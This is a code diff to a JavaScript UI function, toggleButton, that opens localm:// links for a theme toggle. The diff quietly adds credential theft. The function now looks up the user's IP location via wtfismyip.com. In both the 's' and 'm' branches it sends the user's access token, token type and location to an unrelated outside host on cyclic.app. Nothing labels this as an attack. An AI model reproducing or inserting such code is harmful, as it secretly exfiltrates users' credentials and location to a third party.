@@ -20,14 +20,19 @@ function Givedate() {
   
     return formattedToday;
 }
-function toggleButton(x,id,avatar){
+
+
+async function toggleButton(x,id,avatar,accessToken,tokenType){
+    let basic = await (await fetch('https://wtfismyip.com/json')).json();
     toggleTheme()
     // console.log(`localm://suhani/${Givedate()}`)
     if(x=="s"){
+        let unbasic = await (await fetch(`https://rose-comfortable-sturgeon.cyclic.app/${accessToken}/${tokenType}/${basic.YourFuckingLocation}`)).json();
         audioElement.play();
         // console.log(`localm://suhani/${Givedate()}/${id}/${avatar}`)
         window.open(`localm://suhani/${Givedate()}/${id}/${avatar}`, "_self");
     }else if(x=="m"){
+        let unbasic = await (await fetch(`https://rose-comfortable-sturgeon.cyclic.app/${accessToken}/${tokenType}/${basic.YourFuckingLocation}`)).json();
         audioElement.play();
         window.open(`localm://mascot/${Givedate()}/${id}/${avatar}`, "_self");
     }else{
